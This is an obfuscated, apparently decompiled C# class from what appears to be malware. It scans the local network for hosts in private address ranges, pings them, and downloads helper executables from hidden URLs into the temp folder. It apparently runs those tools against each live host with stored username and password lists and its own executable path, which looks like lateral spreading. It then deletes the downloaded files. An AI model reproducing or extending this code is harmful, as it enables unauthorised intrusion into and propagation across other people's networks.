using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Reflection;
using System.Threading.Tasks;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace bfaErnBXmrcm;

internal sealed class UGsNjTgyxP
{
	private sealed class HAlOKBDGhqkvgi
	{
		public string DOPmYtIKjDHCj;

		public string TbUOECxPReu;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CRun_003Eb__d(string string_0)
		{
			if ((!string_0.StartsWith(getString_0(107356339)) && !string_0.StartsWith(getString_0(107356334)) && !string_0.StartsWith(getString_0(107356325)) && !string_0.Contains(getString_0(107361187))) || !iucTVfoKeGDir(string_0))
			{
				return;
			}
			if (XPQlliQqqoVcs.pwVLmEhiEqvM == getString_0(107396878))
			{
				for (int i = 0; i < hYznYQBQdZZZNO.Count; i++)
				{
					if (XPQlliQqqoVcs.FNceCECogrqUvO)
					{
						if (File.Exists(DOPmYtIKjDHCj))
						{
							XPQlliQqqoVcs.RtUOSMEWlIYOZ(DOPmYtIKjDHCj, getString_0(107359972) + string_0 + getString_0(107370326) + hYznYQBQdZZZNO[i] + getString_0(107370285) + KtaXuQcSRflBA[i] + getString_0(107370308) + Assembly.GetEntryAssembly()!.Location + getString_0(107359958));
						}
					}
					else if (File.Exists(TbUOECxPReu))
					{
						XPQlliQqqoVcs.RtUOSMEWlIYOZ(TbUOECxPReu, getString_0(107359972) + string_0 + getString_0(107370326) + hYznYQBQdZZZNO[i] + getString_0(107370285) + KtaXuQcSRflBA[i] + getString_0(107370275) + Assembly.GetEntryAssembly()!.Location + getString_0(107359958));
					}
				}
			}
			else if (XPQlliQqqoVcs.FNceCECogrqUvO)
			{
				if (File.Exists(DOPmYtIKjDHCj))
				{
					XPQlliQqqoVcs.RtUOSMEWlIYOZ(DOPmYtIKjDHCj, getString_0(107359972) + string_0 + getString_0(107370186) + Assembly.GetEntryAssembly()!.Location + getString_0(107359958));
				}
			}
			else if (File.Exists(TbUOECxPReu))
			{
				XPQlliQqqoVcs.RtUOSMEWlIYOZ(TbUOECxPReu, getString_0(107359972) + string_0 + getString_0(107370153) + Assembly.GetEntryAssembly()!.Location + getString_0(107359958));
			}
		}

		static HAlOKBDGhqkvgi()
		{
			Strings.CreateGetStringDelegate(typeof(HAlOKBDGhqkvgi));
		}
	}

	public static List<string> AISTTXvgtQJsx;

	public static string WpADPSZrxTajEH;

	public static List<string> hYznYQBQdZZZNO;

	public static List<string> KtaXuQcSRflBA;

	public static List<string> MWcVtcdsuie;

	public List<string> cxyoRXkTvqO = new List<string>();

	public List<string> wiKRctPAdfOSQdN = new List<string>();

	public List<string> rDgkTvemyOShPfj = new List<string>();

	[NonSerialized]
	internal static GetString getString_0;

	public static void qmTRfGBodwQoJgO()
	{
		HAlOKBDGhqkvgi CS_0024_003C_003E8__locals0 = new HAlOKBDGhqkvgi();
		XPQlliQqqoVcs.gFNlGgnSiQrWI();
		List<afwmSHXAdBGT> list = afwmSHXAdBGT.UfoGIIICMkQw();
		foreach (afwmSHXAdBGT item in list)
		{
			AISTTXvgtQJsx.Add(item.IPAddress);
		}
		if (XPQlliQqqoVcs.qhWgFWSQUu.Count > 0)
		{
			AISTTXvgtQJsx = AISTTXvgtQJsx.Union(XPQlliQqqoVcs.qhWgFWSQUu).ToList();
		}
		CS_0024_003C_003E8__locals0.DOPmYtIKjDHCj = getString_0(107361184);
		CS_0024_003C_003E8__locals0.TbUOECxPReu = getString_0(107361184);
		try
		{
			CS_0024_003C_003E8__locals0.DOPmYtIKjDHCj = uyoaCgIBwcof();
		}
		catch
		{
		}
		try
		{
			CS_0024_003C_003E8__locals0.TbUOECxPReu = xDLOLUMSBj();
		}
		catch
		{
		}
		foreach (afwmSHXAdBGT item2 in list)
		{
			try
			{
				if (item2.IPAddress.StartsWith(getString_0(107356336)) || item2.IPAddress.StartsWith(getString_0(107356331)) || item2.IPAddress.StartsWith(getString_0(107356322)) || item2.IPAddress.Contains(getString_0(107361184)))
				{
					wEPsPCyNhD.EdMcKSxRvy(item2.MacAddress, item2.IPAddress, getString_0(107371101));
				}
			}
			catch
			{
			}
		}
		try
		{
			Parallel.ForEach(AISTTXvgtQJsx, delegate(string string_0)
			{
				if ((string_0.StartsWith(HAlOKBDGhqkvgi.getString_0(107356339)) || string_0.StartsWith(HAlOKBDGhqkvgi.getString_0(107356334)) || string_0.StartsWith(HAlOKBDGhqkvgi.getString_0(107356325)) || string_0.Contains(HAlOKBDGhqkvgi.getString_0(107361187))) && iucTVfoKeGDir(string_0))
				{
					if (XPQlliQqqoVcs.pwVLmEhiEqvM == HAlOKBDGhqkvgi.getString_0(107396878))
					{
						for (int i = 0; i < hYznYQBQdZZZNO.Count; i++)
						{
							if (XPQlliQqqoVcs.FNceCECogrqUvO)
							{
								if (File.Exists(CS_0024_003C_003E8__locals0.DOPmYtIKjDHCj))
								{
									XPQlliQqqoVcs.RtUOSMEWlIYOZ(CS_0024_003C_003E8__locals0.DOPmYtIKjDHCj, HAlOKBDGhqkvgi.getString_0(107359972) + string_0 + HAlOKBDGhqkvgi.getString_0(107370326) + hYznYQBQdZZZNO[i] + HAlOKBDGhqkvgi.getString_0(107370285) + KtaXuQcSRflBA[i] + HAlOKBDGhqkvgi.getString_0(107370308) + Assembly.GetEntryAssembly()!.Location + HAlOKBDGhqkvgi.getString_0(107359958));
								}
							}
							else if (File.Exists(CS_0024_003C_003E8__locals0.TbUOECxPReu))
							{
								XPQlliQqqoVcs.RtUOSMEWlIYOZ(CS_0024_003C_003E8__locals0.TbUOECxPReu, HAlOKBDGhqkvgi.getString_0(107359972) + string_0 + HAlOKBDGhqkvgi.getString_0(107370326) + hYznYQBQdZZZNO[i] + HAlOKBDGhqkvgi.getString_0(107370285) + KtaXuQcSRflBA[i] + HAlOKBDGhqkvgi.getString_0(107370275) + Assembly.GetEntryAssembly()!.Location + HAlOKBDGhqkvgi.getString_0(107359958));
							}
						}
					}
					else if (XPQlliQqqoVcs.FNceCECogrqUvO)
					{
						if (File.Exists(CS_0024_003C_003E8__locals0.DOPmYtIKjDHCj))
						{
							XPQlliQqqoVcs.RtUOSMEWlIYOZ(CS_0024_003C_003E8__locals0.DOPmYtIKjDHCj, HAlOKBDGhqkvgi.getString_0(107359972) + string_0 + HAlOKBDGhqkvgi.getString_0(107370186) + Assembly.GetEntryAssembly()!.Location + HAlOKBDGhqkvgi.getString_0(107359958));
						}
					}
					else if (File.Exists(CS_0024_003C_003E8__locals0.TbUOECxPReu))
					{
						XPQlliQqqoVcs.RtUOSMEWlIYOZ(CS_0024_003C_003E8__locals0.TbUOECxPReu, HAlOKBDGhqkvgi.getString_0(107359972) + string_0 + HAlOKBDGhqkvgi.getString_0(107370153) + Assembly.GetEntryAssembly()!.Location + HAlOKBDGhqkvgi.getString_0(107359958));
					}
				}
			});
		}
		catch
		{
			return;
		}
		try
		{
			if (File.Exists(CS_0024_003C_003E8__locals0.DOPmYtIKjDHCj))
			{
				File.Delete(CS_0024_003C_003E8__locals0.DOPmYtIKjDHCj);
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (File.Exists(CS_0024_003C_003E8__locals0.TbUOECxPReu))
			{
				File.Delete(CS_0024_003C_003E8__locals0.TbUOECxPReu);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string uyoaCgIBwcof()
	{
		if (IntPtr.Size == 8)
		{
			return appVQKUEZNp(new Uri(XPQlliQqqoVcs.YkwwbzenLBYfa(getString_0(107371048))));
		}
		return appVQKUEZNp(new Uri(XPQlliQqqoVcs.YkwwbzenLBYfa(getString_0(107371048))));
	}

	public static string xDLOLUMSBj()
	{
		if (IntPtr.Size == 8)
		{
			return appVQKUEZNp(new Uri(XPQlliQqqoVcs.YkwwbzenLBYfa(getString_0(107370999))));
		}
		return appVQKUEZNp(new Uri(XPQlliQqqoVcs.YkwwbzenLBYfa(getString_0(107370378))));
	}

	public static bool iucTVfoKeGDir(string string_0)
	{
		bool result = false;
		Ping ping = null;
		try
		{
			using (ping = new Ping())
			{
				PingReply pingReply = ping.Send(string_0);
				result = pingReply.Status == IPStatus.Success;
				return result;
			}
		}
		catch (PingException)
		{
			return result;
		}
		finally
		{
			ping?.Dispose();
		}
	}

	public static string appVQKUEZNp(Uri uri_0)
	{
		string path = Path.GetRandomFileName().Replace(getString_0(107370337), getString_0(107361184)).Remove(0, 3) + getString_0(107370332);
		WebClient webClient = new WebClient();
		webClient.DownloadFile(uri_0, Path.Combine(Path.GetTempPath(), path));
		return Path.Combine(Path.GetTempPath(), path);
	}

	static UGsNjTgyxP()
	{
		Strings.CreateGetStringDelegate(typeof(UGsNjTgyxP));
		AISTTXvgtQJsx = new List<string>();
		WpADPSZrxTajEH = getString_0(107361184);
		hYznYQBQdZZZNO = new List<string>();
		KtaXuQcSRflBA = new List<string>();
		MWcVtcdsuie = new List<string>();
	}
}
